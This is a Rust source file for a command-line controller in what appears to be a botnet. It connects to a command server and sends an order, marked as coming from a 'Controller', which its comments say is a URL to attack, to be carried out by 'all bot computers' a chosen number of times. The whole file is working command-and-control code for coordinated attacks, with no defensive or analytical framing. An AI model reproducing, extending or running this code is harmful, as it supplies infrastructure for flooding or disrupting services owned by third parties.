use clap::Parser;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    // ip: the server ip
    #[arg(short, long)]
    ip: String,

    // port: the port where own server will be running
    #[arg(short, long)]
    port: u16,

    // command: url command to attack it.
    #[arg(short, long)]
    command: String,

    // times to repet the command
    #[arg(short, long)]
    times: String,
}

#[derive(Debug)]
enum TypeClient {
    Controller
}

#[tokio::main]
async fn main() {
    // parsing the user arguments in terminal
    let args = Args::parse();

    // forming the address of the server
    let addr = format!("{}:{}", args.ip, args.port);

    // connecting to the server
    let mut socket_stream = match TcpStream::connect(addr).await {
        Ok(socket) => socket,
        Err(e) => {
            eprintln!(
                "[ERROR] ==> cannot connect to the server \nError output ==> {}",
                e
            );
            return;
        }
    };

    // forming the request to the server
    //
    // the request variable been composed by three filds:
    // 
    // - type_client ==> the type of the client if is a bot or controller
    // - command ==> the order to be done for all bot computers
    // - times ==> how many times the program have to do.
    // 
    // the request body is like this:
    // 
    // type_client|command|times
         
    let request = format!("{:?}|{}|{}", TypeClient::Controller, args.command, args.times);

    // sending the order to the server
    match socket_stream.write_all(request.as_bytes()).await {
        Ok(()) => {
            println!("[INFO] ==> Oder sended");
        }
        Err(e) => {
            eprintln!("[ERROR] ==> the order wasn't sended \n{}", e);
        }
    }

    // get the response from server
    let mut buffer = [0u8; 1024];

    let n = match socket_stream.read(&mut buffer).await {
        Ok(n) => n,
        Err(e) => {
            eprintln!("{}", e);
            return;
        },
    };

    let info_server = String::from_utf8_lossy(&buffer[..n]);

    println!("[INFO] ==> {}", info_server);

}
